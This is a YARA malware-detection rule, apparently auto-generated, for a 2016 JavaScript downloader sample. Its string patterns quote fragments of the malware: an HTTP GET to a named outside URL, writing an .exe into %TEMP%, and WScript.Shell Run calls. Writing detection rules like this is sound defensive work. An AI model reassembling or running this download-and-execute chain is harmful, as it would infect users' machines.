rule sig_20160329_367ebf844121945e3caa10e2eb664b58 {
  meta:
    description = "datamaliciousorder - file 20160329_367ebf844121945e3caa10e2eb664b58.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "362792ed891a749f979ef962cddf12785319852eaefba57a1b18393ed5f5f91d"

  strings:
    $s1  = "YY[Ad](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function eN() {return Zc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jjulUvxjzYzIYx.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[W0](C() * 11); if (YY[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Zc = function ud() {return WScript[d](\"WScript.Shell\");}(), Hl = 11;" fullword ascii
    $s5  = "function SF(rp, p0){i = i * 1; return rp - p0;};" fullword ascii
    $s6  = "function ZM(){return \"\" + W;};" fullword ascii
    $s7  = "function Of() {return ((yF == true) && (yF == A)) ? 1 : i;};" fullword ascii
    $s8  = "function xd(Vb){Zc[\"Run\"](Vb, i, i);};" fullword ascii
    $s9  = "function C(){return 22;};" fullword ascii
    $s10 = "function p(B) {var cK = (1, 2, 3, 4, 5, B); return cK;};" fullword ascii
    $s11 = " while (At){" fullword ascii
    $s12 = "function Q(){return d;};" fullword ascii
    $s13 = "function G()" fullword ascii
    $s14 = "var dJ = new this[\"Date\"]();" fullword ascii
    $s15 = "return SF(tN, HO);" fullword ascii
    $s16 = "yF = true; " fullword ascii
    $s17 = "A = true; " fullword ascii
    $s18 = "var yF = false;" fullword ascii
    $s19 = "var Za = false;" fullword ascii
    $s20 = "} catch(X){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}